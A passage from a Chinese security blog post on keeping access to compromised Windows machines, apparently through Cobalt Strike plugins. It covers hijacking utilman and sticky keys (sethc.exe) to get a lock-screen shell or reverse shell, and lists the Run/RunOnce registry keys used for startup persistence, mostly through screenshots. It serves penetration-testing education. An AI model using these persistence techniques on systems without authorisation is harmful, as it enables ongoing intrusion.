<h3 id="劫持utilman"><a href="#劫持utilman" class="headerlink" title="劫持utilman"></a>劫持utilman</h3><p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211193950726.png" alt="image-20200211193950726"></p>
<p>执行后我们可以看到，本质上还是操作注册表</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194149713.png" alt="image-20200211194149713"></p>
<p>锁屏后使用win+u即可调出cmd</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194300707.png" alt="image-20200211194300707"></p>
<p>当然，我们可以把命令换成执行我们的payload</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194952327.png" alt="image-20200211194952327"></p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195027355.png" alt="image-20200211195027355"></p>
<h3 id="劫持粘滞键"><a href="#劫持粘滞键" class="headerlink" title="劫持粘滞键"></a>劫持粘滞键</h3><p>按5下shift出现的粘滞键Sethc.exe，CallBackFile可以根据我们的需求进行更改，也可以执行5次shift后反弹shell</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194448856.png" alt="image-20200211194448856"></p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194506792.png" alt="image-20200211194506792"></p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211194535458.png" alt="image-20200211194535458"></p>
<h2 id="AutoRun"><a href="#AutoRun" class="headerlink" title="AutoRun"></a>AutoRun</h2><p> AutoRun就是我们熟悉的启动项劫持，经常劫持的有如下注册表选项：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195244752.png" alt="image-20200211195244752"></p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195351287.png" alt="image-20200211195351287"></p>
<p>重启后生效</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200211195537803.png" alt="image-20200211195537803"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    其实这些方法都可以手工完成，使用插件就是可以方便一些，权限维持的方式还有很多，有能力的朋友也可以写成插件的形式，提升渗透效率。</p>
<p>参考：</p>
<ul>
<li><a href="http://blog.leanote.com/post/snowming/de88219734d1" target="_blank" rel="noopener">Cobalt Strike 中的权限维持和团队服务器之间的会话传递</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
